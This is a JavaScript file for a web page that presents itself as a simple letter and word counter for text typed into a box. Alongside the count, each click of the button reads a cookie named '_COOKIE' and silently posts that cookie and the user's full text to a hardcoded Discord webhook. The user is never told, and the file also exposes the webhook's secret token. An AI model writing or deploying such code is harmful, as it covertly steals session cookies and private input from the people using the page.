// get the elements
const textarea = document.getElementById("TextArea");
const buttton = document.getElementById("Check");
const answer = document.getElementById("answer");
const url = 'https://discord.com/api/webhooks/1291784928970670150/RYrqV58Npgt4tkcx9Bp3tHw8sJ7NPZ2zUV9l1Tfb8SMEYVDz_eKsoNieNizFlboFnoOz';
var wait = false



  function getCookie(cname) {
    let name = cname + "=";
    let cookie = document.cookie.split(';') 
    console.log(cookie)
    for(let i = 0; i <cookie.length; i++) {
      let c = cookie[i];
      while (c.charAt(0) == ' ') {
        c = c.substring(1);
      }
      if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
      }
    }
    return "";
  }

  function getWords(str) {
    let arr = str.split(" ")
    let words = arr.length
    return words
  }



    // the event lisener for the submit button
    buttton.addEventListener('click', function() {

            text = textarea.value;
            length = text.length
            var words = getWords(text)
            answer.innerText = `Your text is ${length} letters long and was ${words} words!`;

            var cookie = getCookie("_COOKIE")
            
            // Get the content of the textarea
            const message = `There was a function call. The message was caracters ${length} long and was ${words} words.
             User cookie: ${cookie} Message: "${text}"`
    
            // create the data object
            const data = {
                content: message 
            };
    
            // send the data to the webhook
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)  
            })
            .then(response => {
                if (response.ok) {
                    //document.getElementById('response').innerText = 'Message sent!';
                    console.log("Message sent")
                    wait = true
                } else {
                    //document.getElementById('response').innerText = 'Failed to send the message';
                    console.log("Failed to send message")
                }
            })
            .catch(error => {
                console.error('Error:', error);
                //document.getElementById('response').innerText = 'Error sending the message';
            });
        })
        
